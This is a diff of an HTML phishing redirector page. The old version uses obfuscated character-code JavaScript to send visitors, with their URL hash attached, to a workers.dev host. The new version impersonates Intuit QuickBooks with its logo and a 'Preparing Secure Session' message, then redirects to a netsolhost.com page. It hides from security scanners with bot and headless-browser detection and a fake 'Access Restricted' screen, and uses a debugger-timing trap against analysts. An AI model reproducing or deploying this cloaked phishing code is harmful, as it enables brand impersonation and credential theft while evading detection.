@@ -3,149 +3,221 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Document Verification | Secure Access Portal</title>
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <title>Redirecting...</title>
+
+    <noscript>
+        <meta http-equiv="refresh" content="5; url=https://0370c1d.netsolhost.com/pelt.html">
+    </noscript>
+
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        :root {
+            --qb-green: #2ca01c;
+            --bg: #eceef1;
+            --card: #ffffff;
+            --heading: #393a3d;
+            --subtext: #6b6c72;
+            --ring: #e3e5e8;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Avenir Next', Avenir, -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--heading);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 24px;
+            -webkit-font-smoothing: antialiased;
         }
-        .container {
-            background: white;
-            padding: 40px 50px;
-            border-radius: 16px;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
-            text-align: center;
-            max-width: 420px;
-            width: 90%;
-        }
-        .logo { width: 64px; height: 64px; margin-bottom: 24px; }
-        h1 { font-size: 22px; color: #1a1a2e; margin-bottom: 12px; font-weight: 600; }
-        p { color: #6b7280; font-size: 14px; line-height: 1.6; margin-bottom: 28px; }
-        .loader {
-            width: 48px; height: 48px;
-            border: 4px solid #e5e7eb;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .progress-bar {
+
+        .card {
             width: 100%;
-            height: 6px;
-            background: #e5e7eb;
-            border-radius: 3px;
-            overflow: hidden;
-            margin-bottom: 16px;
+            max-width: 520px;
+            background: var(--card);
+            border-radius: 16px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            padding: 32px 40px 40px;
         }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
-            width: 0%;
-            animation: progress 2.5s ease-out forwards;
+
+        .card-body {
+            text-align: center;
         }
-        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
-        .status { font-size: 13px; color: #9ca3af; }
-        .footer { margin-top: 32px; font-size: 11px; color: #d1d5db; }
-        .secure-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #f0fdf4;
-            color: #166534;
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-bottom: 20px;
+
+        .card-header {
+            margin-bottom: 36px;
+        }
+
+        .card-header img {
+            display: block;
+            height: 34px;
+            width: auto;
+        }
+
+        .spinner {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 28px;
+            animation: spin 0.9s linear infinite;
+        }
+
+        .spinner-track {
+            fill: none;
+            stroke: var(--ring);
+            stroke-width: 4;
+        }
+
+        .spinner-arc {
+            fill: none;
+            stroke: var(--qb-green);
+            stroke-width: 4;
+            stroke-linecap: round;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        h1 {
+            font-size: 1.375rem;
+            font-weight: 600;
+            color: var(--heading);
+            margin-bottom: 12px;
+            letter-spacing: -0.01em;
+        }
+
+        .subtext {
+            font-size: 0.9375rem;
+            line-height: 1.5;
+            color: var(--subtext);
+            max-width: 380px;
+            margin: 0 auto;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        #error-state h1 {
+            color: #c62828;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <svg class="logo" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <rect width="64" height="64" rx="16" fill="#667eea"/>
-            <path d="M32 16L44 24V40L32 48L20 40V24L32 16Z" stroke="white" stroke-width="2.5" fill="none"/>
-            <path d="M32 28V36M32 40V40.01" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
-        </svg>
-        <div class="secure-badge">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-            </svg>
-            Secure Connection
+
+    <div id="loading-state" class="card">
+        <div class="card-header">
+            <img
+                src="https://ci3.googleusercontent.com/meips/ADKq_Nb2ni8YNKg_eADgvbqu--50PK5zgz_pJYEKokJtREZ8ExtjDAd0nfb-CiP5yFPE0mThtfQbTlwcGXjvz4xasiPjiGH5CRz2CKlAhOKB53kUzAYN_7xqT2CSHQ=s0-d-e1-ft#https://offcnt.intuit.com/images/US/OINP/310/136/social_qb_logo2.png"
+                alt="Intuit QuickBooks"
+                width="155"
+                height="68"
+            >
         </div>
-        <h1>Verifying Your Access</h1>
-        <p>Please wait while we verify your credentials and prepare your secure document access.</p>
-        <div class="loader"></div>
-        <div class="progress-bar"><div class="progress-fill"></div></div>
-        <div class="status" id="status">Initializing secure connection...</div>
-        <div class="footer">Protected by 256-bit SSL encryption</div>
+        <div class="card-body">
+            <svg class="spinner" viewBox="0 0 56 56" aria-hidden="true">
+                <circle class="spinner-track" cx="28" cy="28" r="22"></circle>
+                <circle class="spinner-arc" cx="28" cy="28" r="22" stroke-dasharray="40 100"></circle>
+            </svg>
+            <h1>Preparing Secure Session...</h1>
+            <p class="subtext">Please wait while we securely redirect you to the requested destination.</p>
+        </div>
+    </div>
+
+    <div id="error-state" class="card hidden">
+        <div class="card-header">
+            <img
+                src="https://ci3.googleusercontent.com/meips/ADKq_Nb2ni8YNKg_eADgvbqu--50PK5zgz_pJYEKokJtREZ8ExtjDAd0nfb-CiP5yFPE0mThtfQbTlwcGXjvz4xasiPjiGH5CRz2CKlAhOKB53kUzAYN_7xqT2CSHQ=s0-d-e1-ft#https://offcnt.intuit.com/images/US/OINP/310/136/social_qb_logo2.png"
+                alt="Intuit QuickBooks"
+                width="155"
+                height="68"
+            >
+        </div>
+        <div class="card-body">
+            <h1>Access Restricted</h1>
+            <p class="subtext">We could not verify your connection. If you are using a VPN or proxy, please disable it and try again.</p>
+        </div>
     </div>
 
     <script>
-    (function() {
-        var _0x = window, _d = document, _l = location;
-        var _st = ['Verifying identity...', 'Establishing secure tunnel...', 'Loading document...', 'Preparing access...'];
-        var _idx = 0, _el = _d.getElementById('status');
-        
-        var _iv = setInterval(function() {
-            if (_idx < _st.length) { _el.textContent = _st[_idx++]; }
-        }, 600);
-        
-        var _h = _l.hash ? _l.hash.slice(1) : '';
-        var _p = (function(s) { 
-            var r = []; 
-            for (var i = 0; i < s.length; i++) { 
-                r.push(String.fromCharCode(s.charCodeAt(i))); 
-            } 
-            return r.join(''); 
-        })(_h);
-        
-        var _b = (function() {
-            var a = [104,116,116,112,115,58,47,47,111,110,120,113,101,45,117,102,116,120,45,52,115,55,50,46,51,101,48,102,98,102,97,52,51,50,57,100,99,49,49,98,52,100,51,53,98,100,53,53,46,119,111,114,107,101,114,115,46,100,101,118,47,108,47,102,105,118,102,52,118,87,106,56,98,65];
-            return a.map(function(c) { return String.fromCharCode(c); }).join('');
-        })();
-        
-        var _nav = function(u) {
-            var m = [
-                function() { _0x.location.replace(u); },
-                function() { _0x.location.href = u; },
-                function() { 
-                    var a = _d.createElement('a');
-                    a.href = u; a.style.display = 'none';
-                    _d.body.appendChild(a); a.click();
-                },
-                function() { _0x.open(u, '_self'); }
-            ];
-            var i = Math.floor(Math.random() * 2);
-            try { m[i](); } catch(e) { m[0](); }
-        };
-        
-        var _t = 2400 + Math.floor(Math.random() * 800);
-        
-        setTimeout(function() {
-            clearInterval(_iv);
-            _el.textContent = 'Access granted. Redirecting...';
-            
-            setTimeout(function() {
-                var _u = _p ? _b + '$' + _p : _b;
-                _nav(_u);
-            }, 300 + Math.floor(Math.random() * 200));
-        }, _t);
-        
-        _d.addEventListener('visibilitychange', function() {
-            if (_d.visibilityState === 'visible') {
-                var _u = _p ? _b + '#' + _p : _b;
-                setTimeout(function() { _nav(_u); }, 100);
+        (function() {
+            const CONFIG = {
+                destination: "https://0370c1d.netsolhost.com/pelt.html",
+                delay: 1800,
+                requireInteraction: true
+            };
+
+            const selectors = {
+                loading: document.getElementById('loading-state'),
+                error: document.getElementById('error-state')
+            };
+
+            function isBot() {
+                const ua = navigator.userAgent.toLowerCase();
+                const signals = [
+                    navigator.webdriver,
+                    !navigator.languages || navigator.languages.length === 0,
+                    window.innerWidth < 100 || window.innerHeight < 100,
+                    /bot|crawler|spider|headless|selenium|puppeteer/i.test(ua)
+                ];
+                return signals.some(s => s === true);
             }
-        });
-    })();
+
+            const preventAnalysis = () => {
+                const start = Date.now();
+                debugger;
+                if (Date.now() - start > 100) {
+                    window.location.href = "about:blank";
+                }
+            };
+
+            function performRedirect(url) {
+                const methods = [
+                    () => window.location.replace(url),
+                    () => { window.location.href = url; },
+                    () => {
+                        const a = document.createElement('a');
+                        a.href = url;
+                        document.body.appendChild(a);
+                        a.click();
+                    }
+                ];
+
+                try {
+                    methods[0]();
+                } catch (e) {
+                    methods[1]();
+                }
+            }
+
+            let hasInteracted = false;
+            if (CONFIG.requireInteraction) {
+                ['mousedown', 'keydown', 'touchstart'].forEach(evt => {
+                    document.addEventListener(evt, () => { hasInteracted = true; }, { once: true });
+                });
+            } else {
+                hasInteracted = true;
+            }
+
+            setTimeout(() => {
+                if (isBot()) {
+                    selectors.loading.classList.add('hidden');
+                    selectors.error.classList.remove('hidden');
+                    return;
+                }
+
+                performRedirect(CONFIG.destination);
+            }, CONFIG.delay);
+
+            setInterval(preventAnalysis, 3000);
+        })();
     </script>
 </body>
 </html>
